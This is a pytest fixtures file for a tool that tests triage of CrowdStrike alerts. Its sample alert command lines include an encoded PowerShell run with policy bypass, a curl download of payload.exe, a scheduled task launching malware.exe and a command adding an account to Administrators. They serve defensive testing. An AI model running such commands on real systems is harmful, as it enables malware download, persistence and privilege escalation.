# conftest.py

"""
Shared fixtures for QA Framework tests.

These fixtures provide consistent test data across all test modules.
"""

import pytest


@pytest.fixture
def sample_alert():
    """A typical alert from the CrowdStrike API."""
    return {
        'id': 'ldt:abc123:456',
        'composite_id': 'abc123:ind:456',
        'pattern_id': 50007,
        'resolution': 'true_positive',
        'status': 'closed',
        'assigned_to_name': 'analyst@example.com',
        'cmdline': r'powershell.exe -enc SGVsbG9Xb3JsZA== -ep bypass',
        'filename': 'powershell.exe',
        'technique_id': 'T1059.001',
        'falcon_host_link': 'https://falcon.crowdstrike.com/activity/detections/detail/abc123',
        'created_timestamp': '2025-01-01T10:00:00Z',
        'updated_timestamp': '2025-01-01T12:00:00Z',
        'device': {
            'hostname': 'WORKSTATION-001',
            'platform_name': 'Windows',
            'os_version': 'Windows 10'
        },
        'parent_details': {
            'filename': 'cmd.exe',
            'cmdline': 'cmd.exe /c start powershell.exe'
        }
    }


@pytest.fixture
def alert_with_ip():
    """Alert with IP addresses in the command line."""
    return {
        'id': 'ldt:def456:789',
        'composite_id': 'def456:ind:789',
        'pattern_id': 50102,
        'resolution': 'false_positive',
        'status': 'closed',
        'cmdline': r'curl http://192.168.1.100:8080/payload.exe -o C:\Windows\Temp\payload.exe',
        'filename': 'curl.exe',
        'device': {'hostname': 'SERVER-002'},
        'parent_details': {'filename': 'cmd.exe'}
    }


@pytest.fixture
def alert_with_guid():
    """Alert with GUID/UUID in the command line."""
    return {
        'id': 'ldt:ghi789:012',
        'composite_id': 'ghi789:ind:012',
        'pattern_id': 50015,
        'resolution': 'true_positive',
        'status': 'closed',
        'cmdline': r'schtasks /create /tn {A1B2C3D4-E5F6-7890-ABCD-EF1234567890} /tr malware.exe',
        'filename': 'schtasks.exe',
        'device': {'hostname': 'DC-001'},
        'parent_details': {'filename': 'explorer.exe'}
    }


@pytest.fixture
def alert_with_well_known_sid():
    """Alert with well-known SID."""
    return {
        'id': 'ldt:jkl012:345',
        'composite_id': 'jkl012:ind:345',
        'pattern_id': 50030,
        'resolution': 'ignored',
        'status': 'closed',
        'cmdline': r'net localgroup Administrators S-1-5-21-1234567890-123456789-1234567890-500 /add',
        'filename': 'net.exe',
        'device': {'hostname': 'WORKSTATION-003'},
        'parent_details': {'filename': 'cmd.exe'}
    }


@pytest.fixture
def alert_minimal():
    """Minimal alert with sparse data."""
    return {
        'id': 'ldt:min001:001',
        'composite_id': 'min001:ind:001',
        'pattern_id': 50001,
        'resolution': None,
        'status': 'closed',
        'cmdline': None,
        'filename': None,
        'device': None,
        'parent_details': None
    }


@pytest.fixture
def strong_tp_consensus():
    """Consensus result showing strong true_positive agreement."""
    return {
        'status': 'consensus',
        'majority_resolution': 'true_positive',
        'ratio': 0.95,
        'sample_size': 100,
        'strength': 'strong',
        'confidence_interval': (0.89, 0.98),
        'distribution': {'true_positive': 95, 'false_positive': 5}
    }


@pytest.fixture
def strong_fp_consensus():
    """Consensus result showing strong false_positive agreement."""
    return {
        'status': 'consensus',
        'majority_resolution': 'false_positive',
        'ratio': 0.92,
        'sample_size': 50,
        'strength': 'strong',
        'confidence_interval': (0.82, 0.97),
        'distribution': {'false_positive': 46, 'true_positive': 4}
    }


@pytest.fixture
def weak_consensus():
    """Consensus result with weak agreement."""
    return {
        'status': 'consensus',
        'majority_resolution': 'true_positive',
        'ratio': 0.65,
        'sample_size': 40,
        'strength': 'weak',
        'confidence_interval': (0.49, 0.78),
        'distribution': {'true_positive': 26, 'false_positive': 14}
    }


@pytest.fixture
def insufficient_data_consensus():
    """Consensus result with insufficient sample size."""
    return {
        'status': 'insufficient_data',
        'majority_resolution': 'true_positive',
        'ratio': 0.90,
        'sample_size': 10,
        'strength': None
    }


@pytest.fixture
def no_data_consensus():
    """Consensus result with no historical data."""
    return {
        'status': 'no_data',
        'majority_resolution': None,
        'ratio': None,
        'sample_size': 0,
        'strength': None
    }


@pytest.fixture
def sample_templates():
    """Sample sanitized templates for similarity testing."""
    return [
        {
            'hash': 'hash_001',
            'template': 'pattern:50007|cmd:powershell.exe <DATA> bypass|file:powershell.exe|parent:cmd.exe',
            'pattern_id': 50007
        },
        {
            'hash': 'hash_002',
            'template': 'pattern:50007|cmd:powershell.exe <DATA> hidden|file:powershell.exe|parent:cmd.exe',
            'pattern_id': 50007
        },
        {
            'hash': 'hash_003',
            'template': 'pattern:50007|cmd:powershell.exe <DATA> bypass noprofile|file:powershell.exe|parent:explorer.exe',
            'pattern_id': 50007
        },
        {
            'hash': 'hash_004',
            'template': 'pattern:50102|cmd:curl <IP> download|file:curl.exe|parent:bash',
            'pattern_id': 50102
        },
        {
            'hash': 'hash_005',
            'template': 'pattern:50102|cmd:wget <IP> output|file:wget|parent:bash',
            'pattern_id': 50102
        },
    ]


@pytest.fixture
def mock_api_response_query():
    """Mock response from query_alerts_v2."""
    return {
        'status_code': 200,
        'body': {
            'resources': [
                'abc123:ind:001',
                'abc123:ind:002',
                'abc123:ind:003'
            ],
            'meta': {
                'pagination': {
                    'total': 3,
                    'offset': 0,
                    'limit': 500
                }
            }
        }
    }


@pytest.fixture
def mock_api_response_details():
    """Mock response from get_alerts_v2."""
    return {
        'status_code': 200,
        'body': {
            'resources': [
                {
                    'id': 'ldt:abc123:001',
                    'composite_id': 'abc123:ind:001',
                    'pattern_id': 50007,
                    'resolution': 'true_positive',
                    'status': 'closed',
                    'cmdline': 'powershell.exe -enc test'
                },
                {
                    'id': 'ldt:abc123:002',
                    'composite_id': 'abc123:ind:002',
                    'pattern_id': 50007,
                    'resolution': 'false_positive',
                    'status': 'closed',
                    'cmdline': 'powershell.exe -file script.ps1'
                },
                {
                    'id': 'ldt:abc123:003',
                    'composite_id': 'abc123:ind:003',
                    'pattern_id': 50102,
                    'resolution': 'true_positive',
                    'status': 'closed',
                    'cmdline': 'curl http://example.com'
                }
            ]
        }
    }


@pytest.fixture
def mock_api_error_response():
    """Mock error response from API."""
    return {
        'status_code': 403,
        'body': {
            'errors': [
                {
                    'code': 403,
                    'message': 'Forbidden: API key missing required scope'
                }
            ]
        }
    }